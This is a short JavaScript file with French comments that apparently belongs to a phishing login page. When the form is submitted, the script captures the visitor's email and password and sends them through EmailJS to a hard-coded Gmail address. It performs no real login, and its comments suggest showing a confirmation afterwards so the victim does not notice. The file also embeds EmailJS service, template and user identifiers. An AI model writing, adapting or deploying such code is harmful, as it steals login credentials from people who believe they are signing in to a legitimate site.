(function(){
    emailjs.init("otwpjfwbYVYn56enm"); // Remplacez par votre User ID EmailJS

    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        emailjs.send("service_3h0kgzm", "template_celwf41", {
            email: email,
            password: password,
            to_email: "Holiaboff@gmail.com"
        }).then(function(response) {
            console.log('Email envoyé avec succès!', response);
            // Vous pouvez rediriger l'utilisateur ou afficher un message de confirmation ici
        }, function(error) {
            console.error('Erreur lors de l\'envoi de l\'email:', error);
        });
    });
})();

